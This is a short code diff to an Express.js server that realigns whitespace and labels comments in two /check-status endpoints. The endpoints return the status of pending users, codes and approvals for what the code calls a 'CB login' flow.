@@ -137,20 +137,20 @@ app.post("/api/verify-code", (req, res) => {
 });
 
 // -----------------
-// Check status
+// Check status (GET)
 // Supports all types: big + CB
 // -----------------
 app.get("/check-status", (req, res) => {
   const identifier = (req.query.identifier || "").trim();
-  if (pendingUsers[identifier])    return res.json({ status: pendingUsers[identifier].status });
-  if (pendingCodes[identifier])    return res.json({ status: pendingCodes[identifier].status });
-  if (pendingGeneric[identifier])  return res.json({ status: pendingGeneric[identifier].status });
-  if (pendingPage[identifier])     return res.json({ status: pendingPage[identifier].status });
+  if (pendingUsers[identifier])     return res.json({ status: pendingUsers[identifier].status });
+  if (pendingCodes[identifier])     return res.json({ status: pendingCodes[identifier].status });
+  if (pendingGeneric[identifier])   return res.json({ status: pendingGeneric[identifier].status });
+  if (pendingPage[identifier])      return res.json({ status: pendingPage[identifier].status });
   if (pendingApprovals[identifier]) return res.json({ status: pendingApprovals[identifier].status });
   res.json({ status: "unknown" });
 });
 
-// For frontend polling of CB login
+// For frontend polling of CB login (POST)
 app.post("/check-status", (req, res) => {
   const { email } = req.body;
   if (!email || !pendingApprovals[email]) return res.json({ status: "pending" });
